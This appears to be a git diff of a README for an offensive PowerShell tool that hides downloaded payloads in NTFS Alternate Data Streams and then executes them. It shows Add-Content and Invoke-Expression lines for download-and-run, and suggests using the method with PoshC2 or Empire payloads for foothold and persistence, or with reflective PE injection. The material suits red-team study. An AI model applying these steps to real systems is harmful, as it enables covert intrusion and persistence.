@@ -39,10 +39,21 @@ Add-Content -Encoding Byte -Path $file -Value $pvfile.Content -Stream 'powerview
 Invoke-Expression (Get-Content -Path $file -Stream 'powerview' -Raw)
 ```
 
-Taking things further I put together a PowerShell script that creates a random filename with a randomish amount of random content and a random ADS name. The script asks the user for the uri of the payload to download and embed into the freshly created file. Also in this example the dowload process is able to detect webproxy settings and use the current users credentials, (Proxy Aware).
+Taking things further I put together a PowerShell script that creates a random filename with a randomish amount of random content and a random ADS name. The script asks the user for the uri of the payload downloads it and embeds into the ADS of the freshly created file.
+The POC then retrieves and executes the downloaded content from the ADS of the random file. Also in this example the download process is able to detect webproxy settings and use the current user's credentials, (Proxy Aware).
 
 ## The script should be ran . sourced i.e.
 ```powershell
 . ./Invoke-ADS.ps1
 ```
-Further uses could be to download a payload, say a standard PoshC2 or Empire base64 encoded payload and hide it in a file and use this as the intial foothold and a persistence method.
+The screenshot below shows PowerView being pulled from a web server, being stored in a file/ADS then retrieved and executed.
+
+![Alt text](./screenshots/invoke-ads-example.png?raw=true "Invoke-ADS example")
+
+Further uses could be to download a payload, say a standard PoshC2 or Empire payload and hide it in ADS of a file and use this as the initial foothold and a persistence method.
+Or perhaps a full executable stored in a PowerShell script and executed using Invoke-ReflectivePEInjection.ps1, similar to the way Invoke-Mimikatz.ps1 works.
+If we look inside the Invoke-Mimikatz script the authors notes at around line 56 state 'This script was created by combining the Invoke-ReflectivePEInjection script written by Joe Bialek and the Mimikatz code written by Benjamin DELPY'
+
+So to achieve a similar outcome with an executable of your making the process would be essentially just encode your exe and store in  $PEBytes and call the Invoke-ReflectivePEInjection function.
+
+The options here are as broad and varied as your imagination.
